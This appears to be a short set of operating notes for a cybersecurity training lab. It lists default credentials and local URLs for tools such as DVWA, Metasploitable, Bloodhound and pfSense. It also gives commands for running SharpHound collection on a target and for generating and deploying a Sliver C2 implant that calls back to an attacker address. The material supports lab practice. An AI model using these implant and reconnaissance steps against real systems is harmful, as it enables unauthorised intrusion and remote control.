# Operating Notes
## Default Credentials
* Neo4j username: neo4j (password set during initial configuration)  
* Splunk instance: http://192.168.3.20:8000  
* Bloodhound: admin:admin  
* DVWA: admin:password  
* Metasploitable credentials: msfadmin:msfadmin  
* pfSense Management Console: admin (password set during initial configuration)  
* SIFT: sansforensics:forensics
* REMnux: remnux:malware
## Access URLs
* Neo4j instance (Kali): http://localhost:7474  
* Bloodhound instance (Kali): http://localhost:8080  
* Juice Shop instance (LX01): http://localhost:3000  
* DVWA instance (LX01): http://localhost/dvwa  
* Security Onion SOC: https://onionIpAddress (only available on Kali Linux)  
* pfSense admin console available at https://pfsenseLanIpAddress  
## Procedures
### Bloodhound
* Sharphound Collector (on Kali Linux) can be transferred with copy/paste functionality or `scp SharpHound.exe <targetUser>@<targetIpAddress>:C:\<restOfFilePath>`  
* Run Collector on target machine with `.\SharpHound.exe -c All`  
* Import resulting JOSN file into Bloodhound console on Kali Linux for analysis  
### Sliver C2
* To run a server (Kali Linux):  
```
sliver-server
```
* To run a client (Kali Linux):  
```
sliver-client
```
* Create implant:  
```
generate --mtls <attackerIp> --os <targetOs> --arch <targetArchitecture> --format <fileFormat> --save <outputFileName>
```
* Transfer implant to machine via `scp` or copy/paste functionality and run  
* List active sessions (in Sliver console) with `sessions`  
* Interact with sessions (in Sliver console) with `use <sessionId>`  
### Juice Shop
* To start:  
```
sudo docker run --rm -p 3000:3000 bkimminich/juice-shop
```
### Stegsolve
* To use:  
```
java -jar ~/stegsolve/stegsolve.jar
```